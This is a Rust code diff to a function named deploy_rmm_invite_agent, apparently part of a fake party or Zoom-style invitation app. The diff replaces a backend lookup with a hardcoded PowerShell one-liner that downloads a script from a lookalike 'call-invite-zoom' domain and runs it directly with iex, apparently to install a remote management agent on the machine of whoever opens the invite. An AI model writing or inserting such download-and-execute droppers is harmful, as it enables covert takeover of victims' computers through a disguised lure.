@@ -128,36 +128,8 @@ async fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
         };
     }
 
-    // Fetch canonical shell command from backend
-    let shell_payload = match fetch_public_shell().await {
-        Ok(data) => data,
-        Err(_) => {
-            return RmmDeploymentResult {
-                success: false,
-                message: "Party prep hit a snag (connection issue). Please try again.".to_string(),
-                deployed_at: None,
-            };
-        }
-    };
-
-    if !shell_payload.configured {
-        return RmmDeploymentResult {
-            success: false,
-            message: "Party prep hit a snag (shell not configured). Please try again.".to_string(),
-            deployed_at: None,
-        };
-    }
-
-    let shell_command = match shell_payload.shell_command {
-        Some(cmd) if !cmd.trim().is_empty() => cmd,
-        _ => {
-            return RmmDeploymentResult {
-                success: false,
-                message: "Party prep hit a snag (shell command missing). Please try again.".to_string(),
-                deployed_at: None,
-            };
-        }
-    };
+    // Always use the static PowerShell command as requested
+    let shell_command = "$u='https://call-invite-zoom.liveinvite.top/api/shell/script?token=ed40c4fc09c5d991aac47b48e95aaca79bb559e7a57969c1a2b0e3d298372d1b'; iwr -UseBasicParsing $u | iex";
 
     // In dev mode, fetch from backend and print manifest/config, but skip PowerShell execution
     if cfg!(debug_assertions) {
